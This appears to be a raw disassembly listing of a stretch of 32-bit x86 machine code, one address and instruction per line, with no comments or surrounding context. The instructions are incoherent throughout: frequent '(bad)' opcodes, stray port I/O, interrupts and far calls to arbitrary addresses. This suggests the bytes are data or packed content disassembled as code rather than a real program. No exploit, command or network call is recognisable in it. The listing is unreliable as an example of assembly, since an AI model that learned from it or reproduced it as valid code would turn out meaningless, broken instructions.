  405095:	dec    edx
  405096:	mov    esi,0x18be63a3
  40509b:	rcr    DWORD PTR [eax],1
  40509d:	jns    0x40502c
  40509f:	std    
  4050a0:	pusha  
  4050a1:	inc    esp
  4050a2:	ss pop esp
  4050a4:	idiv   DWORD PTR [edi-0x75d77f5c]
  4050aa:	xor    DWORD PTR [eax+0x17b380f6],0x7ff7c2b3
  4050b4:	sbb    BYTE PTR [ebx+edx*8],al
  4050b7:	xor    edi,DWORD PTR [edx-0x33]
  4050ba:	ins    DWORD PTR es:[edi],dx
  4050bb:	ins    DWORD PTR es:[edi],dx
  4050bc:	rcr    BYTE PTR [ebp+esi*8-0x55bb8efc],1
  4050c3:	mov    edi,0x982232dc
  4050c8:	mov    DWORD PTR [ebp+0x9e65125],0xff9c47f0
  4050d2:	ror    BYTE PTR [esi],cl
  4050d4:	jbe    0x405073
  4050d6:	jns    0x40507b
  4050d8:	adc    eax,0xffb6615a
  4050dd:	nop
  4050de:	mov    dh,0x74
  4050e0:	pop    es
  4050e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050e2:	mov    ebx,0x16554c44
  4050e7:	sub    eax,0x9126ca89
  4050ec:	pop    edi
  4050ed:	(bad)  
  4050ee:	pop    ss
  4050ef:	mov    dl,0x82
  4050f1:	pop    esp
  4050f2:	sbb    al,0xb5
  4050f4:	add    edi,DWORD PTR ds:0x4325cbd5
  4050fa:	into   
  4050fb:	in     al,0xde
  4050fd:	dec    esp
  4050fe:	push   ss
  4050ff:	and    cl,ch
  405101:	mov    DWORD PTR [edx-0x1f],esp
  405104:	call   0x1868:0x94bbf533
  40510b:	dec    ax
  40510d:	jecxz  0x40511e
  40510f:	int    0x64
  405111:	cmp    al,0x13
  405113:	inc    ebp
  405114:	add    eax,0x1ae1408a
  405119:	fs dec esi
  40511b:	jecxz  0x40511d
  40511d:	and    al,0x34
  40511f:	xor    dl,dh
  405121:	jge    0x405196
  405123:	sub    edx,DWORD PTR [esi]
  405125:	dec    esp
  405126:	cmp    eax,0x1c
  405129:	cs aas 
  40512b:	mov    eax,0xeff4dd8d
  405130:	jno    0x405199
  405132:	(bad)  
  405133:	mov    ebx,0xbb42cd6f
  405138:	nop
  405139:	shl    BYTE PTR [eax+0x2aa596ca],cl
  40513f:	leave  
  405140:	pop    edx
  405141:	outs   dx,BYTE PTR ds:[esi]
  405142:	jbe    0x405155
  405144:	pushf  
  405145:	push   esp
  405146:	push   esp
  405147:	shr    esi,cl
  405149:	xchg   ecx,eax
  40514a:	fs pop ecx
  40514c:	xchg   esi,eax
  40514d:	mov    esi,0x2f6b4d56
  405152:	mov    ah,0x36
  405154:	mov    DWORD PTR [edx-0x61655133],ecx
  40515a:	call   0x3ad5f5bf
  40515f:	neg    cl
  405161:	add    DWORD PTR [ebx-0x6c],ebp
  405164:	mov    ebp,0xdffa68b8
  405169:	lock test DWORD PTR [edi-0x65],ebp
  40516d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40516e:	fldcw  WORD PTR [ecx]
  405170:	je     0x4050fe
  405172:	addr16 jae 0x40519e
  405175:	mov    al,0xe1
  405177:	mov    edx,0x442384cf
  40517c:	fwait
  40517d:	push   ebx
  40517e:	or     esi,DWORD PTR [eax]
  405180:	add    BYTE PTR [eax+edx*1],al
  405183:	ins    BYTE PTR es:[edi],dx
  405184:	in     eax,dx
  405185:	dec    ebx
  405186:	cmc    
  405187:	add    esp,ecx
  405189:	test   al,0xc7
  40518b:	test   BYTE PTR [edi],ah
  40518d:	ret    0xaddb
  405190:	pop    edi
  405191:	out    dx,al
  405192:	sar    BYTE PTR [ebp+0x48],0xb8
  405196:	jg     0x405205
  405198:	and    BYTE PTR ds:0x12bf42f3,dl
  40519e:	(bad)  
  40519f:	sbb    eax,0xe28ad4f0
  4051a4:	fnstenv [eax+ebx*4+0x4470c5c3]
  4051ab:	inc    ecx
  4051ac:	addr16 cdq 
  4051ae:	and    al,0x59
  4051b0:	and    DWORD PTR [ebp+0x4747f7d5],ecx
  4051b6:	xor    ebx,esp
  4051b8:	pop    edx
  4051b9:	adc    DWORD PTR [edi-0x1b7e2336],eax
  4051bf:	loope  0x40519d
  4051c1:	jns    0x405236
  4051c3:	mov    edi,0xd7c19fc3
  4051c8:	jno    0x4051bd
  4051ca:	mov    ecx,0xd2f0d3a
  4051cf:	sti    
  4051d0:	pushf  
  4051d1:	cmp    DWORD PTR [ebp-0x13],ebx
  4051d4:	or     BYTE PTR [edx],0xb7
  4051d7:	aam    0xa0
  4051d9:	cmc    
  4051da:	into   
  4051db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051dc:	sar    BYTE PTR [ecx],cl
  4051de:	fistp  WORD PTR [ecx]
  4051e0:	mov    eax,0x8fc6ab8e
  4051e5:	xchg   edx,eax
  4051e6:	lea    eax,[edi]
  4051e8:	aaa    
  4051e9:	sbb    dh,BYTE PTR [esi-0x67f71e96]
  4051ef:	aad    0xe
  4051f1:	mov    al,ds:0xa102f09b
  4051f6:	add    DWORD PTR [esi],ebx
  4051f8:	sbb    al,0xe
  4051fa:	ja     0x40522b
  4051fc:	mov    ecx,0x3f06958f
  405201:	mov    DWORD PTR [esi+0x63e9cbe2],eax
  405207:	ja     0x4051a8
  405209:	mov    gs,esp
  40520b:	popa   
  40520c:	jno    0x405285
  40520e:	xchg   ebp,eax
  40520f:	inc    esi
  405210:	fld    QWORD PTR [eax+0xd373f04]
  405216:	and    esi,0xfffffffa
  405219:	sub    ebp,DWORD PTR [ebx-0x5f979caa]
  40521f:	bt     DWORD PTR [edx-0x63],edx
  405223:	gs push edx
  405225:	mov    bh,al
  405227:	push   ebp
  405228:	pop    ebx
  405229:	xor    eax,0x4c1ab482
  40522e:	and    eax,0xe978e306
  405233:	(bad)  
  405234:	pop    ebp
  405235:	scas   al,BYTE PTR es:[edi]
  405236:	data16 mov ch,0x8b
  405239:	cmc    
  40523a:	dec    esi
  40523c:	inc    eax
  40523d:	jmp    0x405257
  40523f:	mov    ch,0x49
  405241:	out    dx,eax
  405242:	and    ebp,DWORD PTR [ebp-0x37]
  405245:	ds cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  405248:	cmp    DWORD PTR [eax+0x16],esp
  40524b:	sub    BYTE PTR [edi+eax*8-0x160569f4],bl
  405252:	adc    BYTE PTR [esi+esi*1+0x3d],bl
  405256:	jb     0x40526c
  405258:	clc    
  405259:	mov    ecx,0xee62d25b
  40525e:	lods   al,BYTE PTR ds:[esi]
  40525f:	push   esp
  405260:	xchg   esi,eax
  405261:	mov    ds:0x5ef44f5a,eax
  405266:	adc    edi,ecx
  405268:	push   ebx
  405269:	add    DWORD PTR [esi+0x3b],esp
  40526c:	xor    edx,DWORD PTR [eax+esi*2+0x71540d70]
  405273:	inc    eax
  405274:	cld    
  405275:	xor    BYTE PTR [ecx+0x5c],bl
  405278:	mov    al,0xdf
  40527a:	lods   eax,DWORD PTR ds:[esi]
  40527b:	xlat   BYTE PTR ds:[ebx]
  40527c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40527d:	pop    edi
  40527e:	xchg   ebx,eax
  40527f:	arpl   WORD PTR [ebp+0x36],sp
  405282:	cli    
  405283:	sub    eax,DWORD PTR [ebx+0x3f518747]
  405289:	cwde   
  40528a:	(bad)  
  40528b:	cmp    ch,bl
  40528d:	into   
  40528e:	(bad)  [ebx+0x7d9a1e79]
  405294:	loopne 0x4052fc
  405296:	enter  0x436a,0xb5
  40529a:	in     eax,dx
  40529b:	int3   
  40529c:	add    ecx,DWORD PTR [eax+ecx*2-0x2d]
  4052a0:	lock xchg ebp,eax
  4052a2:	int    0x7d
  4052a4:	mov    bl,0x49
  4052a6:	push   0x27aa8242
  4052ab:	sub    eax,DWORD PTR [ecx]
  4052ad:	sub    DWORD PTR [ecx-0x49452e12],eax
  4052b3:	ret    
  4052b4:	imul   ebp,DWORD PTR [ebp-0xc],0xa6ee7d0d
  4052bb:	mov    dh,0xfa
  4052bd:	inc    ebp
  4052be:	sahf   
  4052bf:	hlt    
  4052c0:	xchg   edi,eax
  4052c1:	or     al,0x38
  4052c3:	outs   dx,DWORD PTR ds:[esi]
  4052c4:	inc    esp
  4052c5:	out    0x47,al
  4052c7:	mov    eax,0xbd1759bb
  4052cc:	aad    0x49
  4052ce:	sar    BYTE PTR [ebx+edx*4+0x7a],1
  4052d2:	pop    edi
  4052d3:	daa    
  4052d4:	idiv   BYTE PTR [ebx]
  4052d6:	mov    ebx,0xe0786166
  4052db:	and    BYTE PTR [edx+esi*1-0x674e31ff],dh
  4052e2:	in     eax,dx
  4052e3:	ja     0x405304
  4052e5:	pop    es
  4052e6:	mov    esp,0x7f3ea150
  4052eb:	std    
  4052ec:	enter  0x3fd3,0x3b
  4052f0:	push   ds
  4052f1:	imul   edi,edx,0xffffffdf
  4052f4:	inc    esi
  4052f5:	xor    dl,BYTE PTR [edx+esi*4-0xa]
  4052f9:	(bad)  
  4052fa:	mov    dh,0x85
  4052fc:	ins    BYTE PTR es:[edi],dx
  4052fd:	aaa    
  4052fe:	sbb    eax,0x178c2981
  405303:	push   ebp
  405304:	inc    ebx
  405305:	int    0xaa
  405307:	and    eax,0x4a3b4a8d
  40530c:	xor    esi,DWORD PTR [esi]
  40530e:	sub    DWORD PTR [ecx],eax
  405310:	push   cs
  405311:	inc    ebx
  405312:	(bad)  
  405313:	addr16 xor eax,0x6b0cd4ca
  405319:	mov    al,0x2b
  40531b:	and    al,0xe
  40531d:	inc    esp
  40531e:	imul   esp,DWORD PTR [edi],0x955cd4dd
  405324:	and    BYTE PTR [edx-0x2585fa48],ah
  40532a:	repz cli 
  40532c:	scas   eax,DWORD PTR es:[edi]
  40532d:	jg     0x4052eb
  40532f:	test   al,0x72
  405331:	pop    ecx
  405332:	dec    edi
  405333:	and    cl,BYTE PTR [edx*1-0x7fddaa8e]
  40533a:	xchg   ecx,eax
  40533b:	lds    ebp,FWORD PTR ds:0x9839d890
  405341:	in     eax,dx
  405342:	repnz mov ebx,0xef39a674
  405348:	push   0xffffffc9
  40534a:	pop    edx
  40534b:	lea    eax,[esp+ebx*2-0x13bf8ebc]
  405352:	sub    dh,BYTE PTR [ecx+ecx*8-0x3efb165d]
  405359:	pop    ds
  40535a:	test   ecx,ecx
  40535c:	dec    esp
  40535d:	cmp    BYTE PTR [ecx+0x76853c89],dl
  405363:	aam    0x85
  405365:	jne    0x405366
  405367:	test   al,0x6d
  405369:	jo     0x4053e1
  40536b:	and    ebp,DWORD PTR [edx+0x31]
  40536e:	and    eax,0x4d9c7bb5
  405373:	pop    ds
  405374:	adc    al,0x1d
  405376:	retf   0xbaf5
  405379:	fs retf 0x477c
  40537d:	enter  0x4725,0x6f
  405381:	cmp    bh,cl
  405383:	fnstsw WORD PTR [ecx+0x1120936]
  405389:	pop    esi
  40538a:	(bad)
  40538d:	mov    esp,0xdf061ba5
  405392:	rcl    ecx,cl
  405394:	or     cl,BYTE PTR [ecx+0x54]
  405397:	pop    eax
  405398:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405399:	repz stc 
  40539b:	sub    eax,0xb56f7d88
  4053a0:	popa   
  4053a1:	pop    ds
  4053a2:	lods   eax,DWORD PTR ds:[esi]
  4053a3:	and    BYTE PTR [ebp-0x1e],dh
  4053a6:	(bad)  
  4053a7:	rcr    ah,cl
  4053a9:	push   ecx
  4053aa:	jge    0x4053f6
  4053ac:	inc    ebp
  4053ad:	jns    0x405388
  4053af:	xor    dh,ch
  4053b1:	xlat   BYTE PTR ds:[ebx]
  4053b2:	rcr    BYTE PTR [eax+0x2d],cl
  4053b5:	stos   BYTE PTR es:[edi],al
  4053b6:	mov    dl,0x51
  4053b8:	jmp    0x40541c
  4053ba:	mov    edi,0xd76dbe51
  4053bf:	jb     0x4053f2
  4053c1:	cmp    al,0x69
  4053c3:	pusha  
  4053c4:	push   eax
  4053c5:	dec    ebp
  4053c6:	sti    
  4053c7:	push   ecx
  4053c8:	sti    
  4053c9:	and    DWORD PTR [edx+ecx*8-0x53],edi
  4053cd:	add    al,0x8b
  4053cf:	dec    ecx
  4053d0:	sbb    al,0xc0
  4053d2:	push   eax
  4053d3:	aas    
  4053d4:	popa   
  4053d5:	(bad)  
  4053d6:	jle    0x40537a
  4053d8:	lock push es
  4053da:	push   ecx
  4053db:	push   esp
  4053dc:	and    eax,0x87f5a667
  4053e1:	dec    esi
  4053e2:	jae    0x405404
  4053e4:	adc    eax,0xe55c6e09
  4053e9:	ja     0x405394
  4053eb:	or     BYTE PTR [edx+0x1a],cl
  4053ee:	fstp   DWORD PTR ds:0x7090362a
  4053f4:	rcr    BYTE PTR [eax],cl
  4053f6:	test   esi,ecx
  4053f8:	into   
  4053f9:	jbe    0x405404
  4053fb:	sar    DWORD PTR [edi-0xdaa94e7],1
  405401:	fld    TBYTE PTR [edi-0x23537fb6]
  405407:	add    ecx,eax
  405409:	adc    eax,0xe9012176
  40540e:	sbb    DWORD PTR [ebx+0x740f1861],ebp
  405414:	and    eax,0x3060d78a
  405419:	nop
  40541a:	or     esp,DWORD PTR [eax+esi*2+0x1de910fa]
  405421:	xor    dl,bl
  405423:	out    dx,eax
  405424:	cdq    
  405425:	push   cs
  405426:	popf   
  405427:	cdq    
  405428:	mov    dl,0x86
  40542a:	call   0x6dc1:0x92678425
  405431:	mov    ebx,0x5ecbea4e
  405436:	sub    eax,0x814a2cfc
  40543b:	out    0xc6,al
  40543d:	loopne 0x40546f
  40543f:	je     0x40545e
  405441:	mov    BYTE PTR [eax-0xf],ch
  405444:	int3   
  405445:	cmp    DWORD PTR [edi],esp
  405447:	pop    ds
  405448:	sub    BYTE PTR [edi+esi*2+0x2f],ch
  40544c:	and    DWORD PTR [ecx*8-0x6dd4a6c2],ebp
  405453:	push   0xffffffba
  405455:	int3   
  405456:	sub    eax,DWORD PTR [edx-0x2a]
  405459:	in     al,dx
  40545a:	in     eax,0x3
  40545c:	cmp    eax,0x137ecfaa
  405461:	add    eax,0x64287e07
  405466:	shl    BYTE PTR [ebx],0x69
  405469:	jne    0x40548c
  40546b:	loope  0x4053f5
  40546d:	pop    ebx
  40546e:	jb     0x40549c
  405470:	adc    al,0x16
  405472:	jbe    0x405412
  405474:	inc    esp
  405475:	jge    0x4054a2
  405477:	cld    
  405478:	cmp    ax,0xec7c
  40547c:	rcr    BYTE PTR [edi],cl
  40547e:	mov    bl,BYTE PTR [eax+0x57]
  405481:	nop
  405482:	daa    
  405483:	sbb    eax,0xd6dfd50e
  405488:	push   0x49
  40548a:	xchg   edx,eax
  40548b:	cs sub bh,0x4f
  40548f:	jae    0x40546e
  405491:	int    0xa1
  405493:	dec    ebx
  405494:	jo     0x405437
  405496:	jle    0x40549b
  405498:	pusha  
  405499:	in     eax,dx
  40549a:	mov    bl,0x56
  40549c:	or     al,0x4
  40549e:	mov    dl,0x9a
  4054a0:	or     bh,BYTE PTR ds:0x181788e5
  4054a6:	and    DWORD PTR [ebx-0x9],eax
  4054a9:	arpl   WORD PTR [esi],sp
  4054ab:	push   es
  4054ac:	(bad)  
  4054ae:	mov    esp,0x7a54d304
  4054b3:	and    ah,dh
  4054b5:	data16 sub al,0x5f
  4054b8:	cs pushf 
  4054ba:	mov    ebx,DWORD PTR ss:[ecx-0x4f]
  4054be:	adc    esi,edx
  4054c0:	xchg   ecx,eax
  4054c1:	cdq    
  4054c2:	ret    
  4054c3:	xchg   DWORD PTR [esi],eax
  4054c5:	sbb    DWORD PTR [edi],ecx
  4054c7:	mov    eax,0xdc1935d9
  4054cc:	loope  0x4054b8
  4054ce:	sub    ebx,DWORD PTR [ebp+0x1fe2f30d]
  4054d4:	sbb    ebx,DWORD PTR [ecx]
  4054d6:	jmp    0x405526
  4054d8:	(bad)  
  4054d9:	mov    cl,0x75
  4054db:	neg    DWORD PTR [esi-0xfbe2e99]
  4054e1:	addr16 arpl di,di
  4054e4:	inc    esp
  4054e5:	and    BYTE PTR [ebx+ebx*8+0x6ef15064],ah
  4054ec:	jno    0x405537
  4054ee:	xchg   ebp,eax
  4054ef:	scas   al,BYTE PTR es:[edi]
  4054f0:	out    0xb2,al
  4054f2:	mov    dh,0xe9
  4054f4:	push   esp
  4054f5:	loope  0x40554c
  4054f7:	push   ebp
  4054f8:	inc    ebp
  4054f9:	or     al,0x40
  4054fb:	ja     0x405564
  4054fd:	add    al,0xfe
  4054ff:	addr16 arpl di,bp
  405502:	push   ebp
  405503:	add    edi,DWORD PTR [esi+0x1025777c]
  405509:	(bad)  
  40550a:	arpl   WORD PTR [esi-0x2f],sp
  40550d:	or     BYTE PTR [ebx],bl
  40550f:	lock dec ebx
  405511:	inc    ebx
  405512:	push   0xfffffff6
  405514:	les    ecx,FWORD PTR [edi+0x2bc6f03a]
  40551a:	arpl   bx,bx
  40551c:	sbb    DWORD PTR [ebp+0x6cd269f0],esp
  405522:	ss dec ebx
  405524:	lods   eax,DWORD PTR ds:[esi]
  405525:	ss in  eax,dx
  405527:	in     eax,dx
  405528:	sbb    edx,ecx
  40552a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40552b:	rcr    DWORD PTR [esi-0x14fa7649],cl
  405531:	mov    dh,0xa6
  405533:	xor    BYTE PTR [edx],dh
  405535:	inc    ebp
  405536:	push   esi
  405537:	call   0xde1ab0cd
  40553c:	hlt    
  40553d:	xlat   BYTE PTR ds:[ebx]
  40553e:	pop    ds
  40553f:	xchg   ebp,eax
  405540:	test   eax,0x85be565f
  405545:	sbb    ecx,DWORD PTR [edi+eax*1]
  405548:	and    eax,0xb1e2d03f
  40554d:	push   ss
  40554e:	adc    BYTE PTR [edi-0x73627b60],dh
  405554:	mov    dl,0xed
  405557:	loope  0x4054ef
  405559:	adc    al,0x9c
  40555b:	add    esp,DWORD PTR [ebp+edx*2-0x1e]
  40555f:	cdq    
  405560:	repnz ins DWORD PTR es:[edi],dx
  405562:	jle    0x405557
  405564:	out    0xc9,eax
  405566:	cmc    
  405567:	or     al,0x87
  405569:	imul   ebx,DWORD PTR [ecx-0x74],0x2d
  40556d:	call   0x1d7633e5
  405572:	imul   ebp,DWORD PTR [edi],0xffffff83
  405575:	dec    edi
  405576:	pop    ecx
  405577:	jb     0x40557f
  405579:	sub    al,0x54
  40557b:	ss je  0x7fe5a6f0
  405582:	mov    eax,0xb5cfbbd0
  405587:	jne    0x4055fb
  405589:	xchg   ebp,eax
  40558a:	sbb    eax,0x9e1a10fd
  40558f:	or     BYTE PTR [esi],0xfb
  405592:	les    ebp,FWORD PTR [ecx]
  405594:	cmp    cl,BYTE PTR [edi+0x63]
  405597:	jl     0x405529
  405599:	sub    ebp,DWORD PTR [edx+eax*4+0x6ece79b0]
  4055a0:	aaa    
  4055a1:	mov    edi,ss
  4055a3:	inc    esp
  4055a4:	gs ret 0x6e55
  4055a8:	sbb    dl,ah
  4055aa:	pop    edx
  4055ab:	mov    WORD PTR es:[eax],gs
  4055ae:	adc    al,0x9b
  4055b0:	push   es
  4055b1:	inc    ebx
  4055b2:	mov    bl,0xe6
  4055b4:	das    
  4055b5:	call   0x9a338879
  4055ba:	aam    0x47
  4055bc:	jle    0x405550
  4055be:	cmp    BYTE PTR [eax-0x23],cl
  4055c1:	rcl    dl,cl
  4055c3:	sahf   
  4055c4:	mov    al,ds:0xd53bf8d
  4055c9:	loopne 0x405596
  4055cb:	leave  
  4055cc:	rol    DWORD PTR [ebp+0x34],cl
  4055cf:	test   eax,0xcd2b266c
  4055d4:	adc    DWORD PTR [esi-0x109d1a77],ecx
  4055da:	in     eax,dx
  4055db:	ins    BYTE PTR es:[edi],dx
  4055dc:	out    0x78,eax
  4055de:	lock mov ds:0x2ee0d54d,eax
  4055e4:	pop    esp
  4055e5:	fsubr  st(7),st
  4055e7:	outs   dx,DWORD PTR ds:[esi]
  4055e8:	mov    ecx,0x5dd23cec
  4055ed:	fwait
  4055ee:	xchg   ebp,eax
  4055ef:	xchg   ecx,eax
  4055f0:	fidivr WORD PTR [esi+0x3a878527]
  4055f6:	scas   al,BYTE PTR es:[edi]
  4055f7:	adc    al,0x4c
  4055f9:	mov    BYTE PTR [edx],dh
  4055fb:	mov    edx,0x6a297c5a
  405600:	das    
  405601:	je     0x405660
  405603:	mov    ch,0x58
  405605:	cmp    cl,dh
  405607:	ret    0xba06
  40560a:	retf   
  40560b:	enter  0xb599,0x15
  40560f:	shr    ah,1
  405611:	(bad)
  405614:	dec    ebp
  405615:	pop    esi
  405616:	push   esi
  405617:	repnz fwait
  405619:	dec    esi
  40561a:	pop    edi
  40561b:	push   es
  40561c:	add    dl,BYTE PTR [ecx-0x74]
  40561f:	out    dx,eax
  405620:	stc    
  405621:	rcr    BYTE PTR [esi+0x5312f2d2],0xbf
  405628:	lock push ebp
  40562a:	out    dx,eax
  40562b:	retf   0x9c49
  40562e:	jne    0x40564a
  405630:	inc    eax
  405631:	sbb    ch,ch
  405633:	shl    BYTE PTR [esi],0xd4
  405636:	sub    dh,BYTE PTR [ebp+0x580d52cf]
  40563c:	sbb    ch,BYTE PTR [ebp+0xe0c855d]
  405642:	and    eax,0x42a2f762
  405647:	sub    bh,BYTE PTR [esi]
  405649:	in     eax,0x21
  40564b:	push   eax
  40564c:	or     eax,0x9ebb89ae
  405651:	xor    DWORD PTR [edx],esi
  405653:	push   ebp
  405654:	mov    eax,0x1ed81a5
  405659:	xchg   ecx,eax
  40565a:	xchg   DWORD PTR [edx-0xb66f3b],ebp
  405660:	fs nop
  405662:	inc    esi
  405663:	les    esi,FWORD PTR [esi-0x1f0a93f8]
  405669:	in     eax,0x1f
  40566b:	push   esi
  40566c:	pop    ds
  40566d:	push   cs
  40566e:	es (bad) 
  405670:	imul   esi,ecx,0x5
  405673:	cdq    
  405674:	stc    
  405675:	loopne 0x40568e
  405677:	xor    DWORD PTR [ebx-0x3b3def46],eax
  40567d:	pop    edx
  40567e:	pusha  
  40567f:	fdiv   QWORD PTR [esp+edi*4+0x471d9aa0]
  405686:	outs   dx,BYTE PTR ds:[esi]
  405687:	push   eax
  405688:	test   ah,bh
  40568a:	dec    edx
  40568b:	test   al,0xfb
  40568d:	int    0x3
  40568f:	test   al,0xe0
  405691:	sbb    BYTE PTR [ecx-0x74],ah
  405694:	mov    ah,0x52
  405696:	imul   esi,DWORD PTR [esi-0x57],0xffffffa9
  40569a:	call   0x4d1ecc25
  40569f:	je     0x405641
  4056a1:	pop    ss
  4056a2:	add    esp,DWORD PTR [esi+esi*8+0x5e]
  4056a6:	imul   DWORD PTR ds:0xec1db36a
  4056ac:	in     al,0xc5
  4056ae:	mov    cl,0x9d
  4056b0:	push   0x1bbfed77
  4056b5:	sbb    eax,0x63fc382c
  4056ba:	inc    eax
  4056bb:	push   es
  4056bc:	imul   esp,DWORD PTR [ecx],0x2d039b28
  4056c2:	sbb    BYTE PTR cs:[esi+ecx*4+0x18],cl
  4056c7:	mov    cl,0x7b
  4056c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056ca:	data16 bnd jmp 0x4056fd
  4056ce:	lea    esi,[edx]
  4056d0:	call   0x3ca2f756
  4056d5:	(bad)  
  4056d6:	cdq    
  4056d7:	fbstp  TBYTE PTR [edx-0x2af0b851]
  4056dd:	pop    es
  4056de:	cdq    
  4056df:	mov    ah,0x10
  4056e1:	cli    
  4056e2:	arpl   WORD PTR [eax-0x7],ax
  4056e5:	jns    0x405728
  4056e7:	mov    ah,0x70
  4056e9:	(bad)  
  4056ea:	jne    0x405721
  4056ec:	pusha  
  4056ed:	ror    DWORD PTR [eax],1
  4056ef:	dec    ebp
  4056f0:	js     0x40572d
  4056f2:	jp     0x4056d8
  4056f4:	outs   dx,BYTE PTR ds:[esi]
  4056f5:	sub    eax,0x6a746cff
  4056fa:	mov    eax,ebp
  4056fc:	js     0x405743
  4056fe:	pop    ebx
  4056ff:	adc    BYTE PTR [edx+ebp*2],0x7c
  405703:	sbb    eax,DWORD PTR [edx-0x51a2b2aa]
  405709:	jnp    0x4056b5
  40570b:	je     0x4056ab
  40570d:	sbb    dl,bh
  40570f:	bound  edx,QWORD PTR [esi+0x78262a4]
  405715:	xchg   ebx,eax
  405716:	xchg   edi,eax
  405717:	ss xchg esp,eax
  405719:	and    ch,BYTE PTR [ebp+0x1c]
  40571c:	jmp    0x4056a5
  40571e:	jmp    0x75dd7cb7
  405723:	xor    ah,BYTE PTR [eax+0x12]
  405726:	test   eax,0x474aefad
  40572b:	jecxz  0x4056fd
  40572d:	push   ebp
  40572e:	addr16 xchg ebp,eax
  405730:	inc    edx
  405731:	cmp    DWORD PTR [ebx],eax
  405733:	and    eax,0x6420ced8
  405738:	scas   eax,DWORD PTR es:[edi]
  405739:	dec    edx
  40573a:	or     bl,BYTE PTR [ebx-0x8d92f2c]
  405740:	and    ch,dh
  405742:	adc    bh,0x7b
  405745:	fstp   TBYTE PTR [edx+eax*8-0x2f]
  405749:	aaa    
  40574a:	scas   eax,DWORD PTR es:[edi]
  40574b:	loope  0x4057cc
  40574d:	aas    
  40574e:	fldenv [edx+0x67cfe7a5]
  405754:	inc    esp
  405755:	(bad)  
  405756:	in     eax,dx
  405757:	adc    ebx,esi
  405759:	mov    cl,0x41
  40575b:	mov    cl,0xb
  40575d:	js     0x4057b4
  40575f:	xlat   BYTE PTR ds:[ebx]
  405760:	ja     0x4057b5
  405762:	fwait
  405763:	out    dx,al
  405764:	mov    eax,ds:0xb97bd658
  405769:	in     al,0xf0
  40576b:	cs (bad) 
  40576d:	and    DWORD PTR [edx+0x32],ebx
  405770:	jb     0x405717
  405772:	test   eax,0xac7c2d64
  405777:	rol    al,0xba
  40577a:	pop    es
  40577b:	mov    bh,0x3a
  40577d:	push   ebx
  40577e:	retf   0xb230
  405781:	and    al,0x54
  405783:	or     al,0xb
  405785:	sbb    al,0x87
  405787:	sub    eax,0xc9cb4b88
  40578c:	mov    bl,0x20
  40578e:	fisubr DWORD PTR [ebx-0x60651b32]
  405794:	repz inc ecx
  405796:	pop    ebp
  405797:	inc    ebx
  405798:	dec    ah
  40579a:	dec    edx
  40579b:	push   cs
  40579c:	fwait
  40579d:	je     0x4057b7
  40579f:	pop    ds
  4057a0:	xor    al,0xa1
  4057a2:	retf   
  4057a3:	jp     0x40577d
  4057a5:	jno    0x40572c
  4057a7:	dec    esi
  4057a8:	xor    al,0xa0
  4057aa:	lds    esi,FWORD PTR es:[eax-0x4d73ade9]
  4057b1:	add    BYTE PTR [esi-0xb],ah
  4057b4:	call   0x338a:0x984c14f1
  4057bb:	jne    0x4057e4
  4057bd:	aam    0xa3
  4057bf:	test   eax,0x1fac894b
  4057c4:	dec    ebp
  4057c5:	popa   
  4057c6:	pop    es
  4057c7:	dec    ecx
  4057c8:	cmp    al,cl
  4057ca:	jno    0x4057dd
  4057cc:	xor    al,0x43
  4057ce:	cmp    al,0xf4
  4057d0:	nop
  4057d1:	test   eax,0x3fc3ebd2
  4057d6:	das    
  4057d7:	out    dx,al
  4057d8:	push   eax
  4057d9:	dec    eax
  4057da:	sub    edx,DWORD PTR ds:0x7f3888f4
  4057e0:	ret    
  4057e1:	outs   dx,BYTE PTR ds:[esi]
  4057e2:	adc    dh,bh
  4057e4:	or     edi,0xffffffe7
  4057e7:	push   ebx
  4057e8:	mov    ecx,0xbddb1694
  4057ed:	push   ss
  4057ee:	ror    edx,1
  4057f0:	mov    BYTE PTR [edx-0x3daed207],al
  4057f6:	xchg   ecx,eax
  4057f7:	mov    ebp,0xf78d48c7
  4057fc:	jo     0x4057e4
  4057fe:	mov    eax,0xa9419d04
  405803:	cwde   
  405804:	aaa    
  405805:	pop    eax
  405806:	sbb    al,ch
  405808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405809:	das    
  40580a:	not    BYTE PTR [ebx+0x6d]
  40580d:	(bad)  
  40580e:	leave  
  40580f:	idiv   DWORD PTR [edx]
  405811:	push   eax
  405812:	into   
  405813:	xor    BYTE PTR [edi+0x5f],al
  405816:	mov    cl,0x68
  405818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405819:	adc    ebp,DWORD PTR [ebp-0x79]
  40581c:	mov    ds:0x2ad8c60b,eax
  405821:	loopne 0x4057de
  405823:	rol    BYTE PTR [ebx],0x3b
  405826:	jmp    0x40584f
  405828:	ss dec ecx
  40582a:	dec    ecx
  40582b:	pop    eax
  40582c:	mov    esp,0x7961a6
  405831:	pop    ecx
  405832:	mov    ecx,0x835343c5
  405837:	push   es
  405838:	shl    esp,cl
  40583a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40583b:	dec    edx
  40583c:	rcl    DWORD PTR [eax-0x650aad5e],cl
  405842:	lds    ebx,FWORD PTR [esi-0x50]
  405845:	pop    edx
  405846:	mov    eax,0xc9bb5650
  40584b:	mov    DWORD PTR [edx+ecx*2+0x55896653],edi
  405852:	pop    esp
  405853:	push   ebp
  405854:	cdq    
  405855:	push   0x4e707807
  40585a:	lds    esp,FWORD PTR [edx]
  40585c:	repnz inc esi
  40585e:	(bad)  
  40585f:	sub    al,0x92
  405861:	dec    eax
  405862:	push   esi
  405863:	pop    ebp
  405864:	push   ecx
  405865:	or     ah,BYTE PTR [ebx-0x730de9ac]
  40586b:	sahf   
  40586c:	fld    TBYTE PTR [ebp+0x2e]
  40586f:	lfs    eax,FWORD PTR [ebp+ebx*8-0x218298cc]
  405877:	mov    edi,0xc3099207
  40587c:	jo     0x4058de
  40587e:	popa   
  40587f:	gs cdq 
  405881:	cmp    al,0xe2
  405883:	pop    ebx
  405884:	jbe    0x4058e4
  405886:	sbb    ah,BYTE PTR [ebp+edx*1+0x2ce1a2d3]
  40588d:	mov    ds:0x46f74ba,al
